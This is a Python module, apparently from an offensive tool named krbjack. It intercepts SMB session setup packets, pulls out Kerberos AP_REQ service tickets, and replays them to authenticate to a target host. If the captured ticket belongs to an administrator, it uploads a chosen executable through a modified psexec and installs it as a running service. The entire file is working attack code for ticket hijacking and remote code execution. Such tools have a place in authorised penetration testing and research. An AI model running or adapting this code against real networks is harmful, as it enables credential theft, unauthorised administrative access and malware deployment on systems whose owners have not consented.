from scapy.layers.smb2 import SMB2_Header, SMB2_Session_Setup_Request
from krbjack.modules.utils import HomeBackedPSEXEC
from impacket.smbconnection import SessionError
from scapy.layers.kerberos import KRB_AP_REQ
from scapy.layers.gssapi import SPNEGO_Token

from .utils import getAuthenticatedImpacketSMBConnection

"""
This module is made to catch AP_REQ on the fly in SMB connections from clients to the
destination target. When AP_REQ is received, it checks if it belongs to a privileged
user on the target. If it is the case, the ticket is used directly to push the chosen
binary on the remote system, creates and starts a service for it.
"""


class Module:
    # This attribute is used to specify a TCP port on which the packets will be checked.
    # The method which determines if packets are interesting will only see packets incoming
    # from this TCP port.
    port = 445
    # This flag is used to decide wether this module has a cleanup() method or not, which
    #   should be called before ending everything.
    # Here we need to uninstall a service because of how psexec works
    requires_cleaning = True

    def __init__(self, args):
        self.service = None

    # The function that must return True of False to indicate wether a packet is supposed
    # "interesting" or not (if it contains an AP_REQ or not for our use case).
    # args:
    #   - peer : the client sending the packet (2-tuple ip, source_port)
    #   - dport: the local port that received the packet (the one the target destination would have
    #       received the packet on)
    #   - data : the packet itself, in raw bytes
    # Return:
    #    The method must return a 2-tuple : bool, self
    #    The boolean indicates if the packet is supposed to be interesting
    #    The second element must be the self object
    def packet_to_catch(self, peer, dport, data):
        # This is where we want to return True if a packet contains an AP_REQ
        ip, sport = peer
        if dport == 445 and data[4:8] == b'\xfeSMB' and data[16:18] == b'\x01\x00':
            pkt = SMB2_Header(data[4:])
            try:
                # Trying to match an SMB2_session setup request with an
                # SPNEGO token which happens to be a Kerberos AP_REQ
                if isinstance(
                    pkt[SMB2_Session_Setup_Request].Buffer[0][1][SPNEGO_Token]
                    .value.root.innerContextToken.root,
                    KRB_AP_REQ
                ):
                    return True, self
            except (KeyError, AttributeError):
                return False, self
        return False, self

    # What runs when an interesting packet is seen:
    # args :
    #   jacker : the KrbJacker instance, with all its arguments
    #   client_ip : the ip of the client sending the interesting packet (2-tuple ip, srcport)
    #   the_packet : the interesting packet
    # must return a bool stating wether or not the attack is successful.
    #   True/successful -> the entire program exits, DNS is set back to normal, forwarding is
    #       stopped ;
    #   False/unsuccessful -> forwarding is set up again, the client is added to
    #       the whitelist of clients not to inspect traffic from.
    def run(self, jacker, client_ip, the_packet):
        if jacker.args.executable is None:
            return False
        print("=== KRB hijacking module ===")
        pkt = SMB2_Header(the_packet[4:])
        # Fetch the AP_REQ
        apreq = (
            pkt[SMB2_Session_Setup_Request].Buffer[0][1][SPNEGO_Token]
            .value.root.innerContextToken.root
        )
        # Display the realm and SPN for the ST
        print(f"\tTicket captured from {client_ip[0]} ! ")
        print(
            f"\trealm : {apreq.ticket.realm.val}, service : "
            f"{apreq.ticket.sname.nameString[0].val}/{apreq.ticket.sname.nameString[1].val}"
        )
        # setting up the impacket SMBConnection from the previously hijacked one
        authenticated_setup_request = pkt[SMB2_Session_Setup_Request]
        gssapi_blob_length = authenticated_setup_request.SecurityLen
        gssapi_blob = the_packet[-gssapi_blob_length:]
        connection = getAuthenticatedImpacketSMBConnection(
            jacker.destination_name, jacker.destination_ip, gssapi_blob
        )
        if connection is None:
            print("\tThe connection could not be hijacked, the stolen ticket didnt work.")
            return False
        # Checking if the user will be able to psexec
        print("\tNow let's see if this ticket belongs to a privileged user ...")
        try:
            connection.listPath("ADMIN$", "/*")
            print("\t=== Admin connection set up !!!")
            print("\t=== Launching home-baked/modified psexec ...")
            # Runs our modified/simpler psexec
            executer = HomeBackedPSEXEC(jacker.args.executable)
            self.service = executer.run(connection)
            if self.service is not None:
                print("\tService installed and running !")
                return True
            else:
                return False
        except SessionError:
            return False

    # This method can be used to clean stuff. It is called if necessary as defined in
    # this class "requires_cleaning" attribute
    def cleanup(self):
        if self.service is not None:
            print("\tUninstalling service ...")
            self.service.uninstall()
